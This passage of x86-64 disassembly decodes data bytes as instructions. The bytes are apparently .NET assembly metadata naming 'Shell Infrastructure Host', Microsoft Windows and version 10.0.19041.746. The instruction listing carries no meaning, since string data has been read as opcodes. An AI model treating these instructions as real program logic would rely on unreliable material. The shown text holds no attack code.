   14000361d:	01 00                	add    %eax,(%rax)
   14000361f:	19 53 68             	sbb    %edx,0x68(%rbx)
   140003622:	65 6c                	gs insb (%dx),(%rdi)
   140003624:	6c                   	insb   (%dx),(%rdi)
   140003625:	20 49 6e             	and    %cl,0x6e(%rcx)
   140003628:	66 72 61             	data16 jb 0x14000368c
   14000362b:	73 74                	jae    0x1400036a1
   14000362d:	72 75                	jb     0x1400036a4
   14000362f:	63 74 75 72          	movsxd 0x72(%rbp,%rsi,2),%esi
   140003633:	65 20 48 6f          	and    %cl,%gs:0x6f(%rax)
   140003637:	73 74                	jae    0x1400036ad
   140003639:	00 00                	add    %al,(%rax)
   14000363b:	2b 01                	sub    (%rcx),%eax
   14000363d:	00 26                	add    %ah,(%rsi)
   14000363f:	4d 69 63 72 6f 73 6f 	imul   $0x666f736f,0x72(%r11),%r12
   140003646:	66 
   140003647:	74 c2                	je     0x14000360b
   140003649:	ae                   	scas   (%rdi),%al
   14000364a:	20 57 69             	and    %dl,0x69(%rdi)
   14000364d:	6e                   	outsb  (%rsi),(%dx)
   14000364e:	64 6f                	outsl  %fs:(%rsi),(%dx)
   140003650:	77 73                	ja     0x1400036c5
   140003652:	c2 ae 20             	ret    $0x20ae
   140003655:	4f 70 65             	rex.WRXB jo 0x1400036bd
   140003658:	72 61                	jb     0x1400036bb
   14000365a:	74 69                	je     0x1400036c5
   14000365c:	6e                   	outsb  (%rsi),(%dx)
   14000365d:	67 20 53 79          	and    %dl,0x79(%ebx)
   140003661:	73 74                	jae    0x1400036d7
   140003663:	65 6d                	gs insl (%dx),(%rdi)
   140003665:	00 00                	add    %al,(%rax)
   140003667:	33 01                	xor    (%rcx),%eax
   140003669:	00 2e                	add    %ch,(%rsi)
   14000366b:	c2 a9 20             	ret    $0x20a9
   14000366e:	4d 69 63 72 6f 73 6f 	imul   $0x666f736f,0x72(%r11),%r12
   140003675:	66 
   140003676:	74 20                	je     0x140003698
   140003678:	43 6f                	rex.XB outsl (%rsi),(%dx)
   14000367a:	72 70                	jb     0x1400036ec
   14000367c:	6f                   	outsl  (%rsi),(%dx)
   14000367d:	72 61                	jb     0x1400036e0
   14000367f:	74 69                	je     0x1400036ea
   140003681:	6f                   	outsl  (%rsi),(%dx)
   140003682:	6e                   	outsb  (%rsi),(%dx)
   140003683:	2e 20 41 6c          	cs and %al,0x6c(%rcx)
   140003687:	6c                   	insb   (%dx),(%rdi)
   140003688:	20 52 69             	and    %dl,0x69(%rdx)
   14000368b:	67 68 74 73 20 52    	addr32 push $0x52207374
   140003691:	65 73 65             	gs jae 0x1400036f9
   140003694:	72 76                	jb     0x14000370c
   140003696:	65 64 2e 00 00       	gs fs add %al,%fs:(%rax)
   14000369b:	13 01                	adc    (%rcx),%eax
   14000369d:	00 0e                	add    %cl,(%rsi)
   14000369f:	31 30                	xor    %esi,(%rax)
   1400036a1:	2e 30 2e             	cs xor %ch,(%rsi)
   1400036a4:	31 39                	xor    %edi,(%rcx)
   1400036a6:	30 34 31             	xor    %dh,(%rcx,%rsi,1)
   1400036a9:	2e 37                	cs (bad)
   1400036ab:	34 36                	xor    $0x36,%al
   1400036ad:	00 00                	add    %al,(%rax)
   1400036af:	08 01                	or     %al,(%rcx)
   1400036b1:	00 08                	add    %cl,(%rax)
   1400036b3:	00 00                	add    %al,(%rax)
   1400036b5:	00 00                	add    %al,(%rax)
   1400036b7:	00 1e                	add    %bl,(%rsi)
   1400036b9:	01 00                	add    %eax,(%rax)
   1400036bb:	01 00                	add    %eax,(%rax)
   1400036bd:	54                   	push   %rsp
   1400036be:	02 16                	add    (%rsi),%dl
   1400036c0:	57                   	push   %rdi
   1400036c1:	72 61                	jb     0x140003724
   1400036c3:	70 4e                	jo     0x140003713
   1400036c5:	6f                   	outsl  (%rsi),(%dx)
   1400036c6:	6e                   	outsb  (%rsi),(%dx)
   1400036c7:	45 78 63             	rex.RB js 0x14000372d
   1400036ca:	65 70 74             	gs jo  0x140003741
   1400036cd:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%rdi),%ebp
   1400036d4:	77 73                	ja     0x140003749
   1400036d6:	01 00                	add    %eax,(%rax)
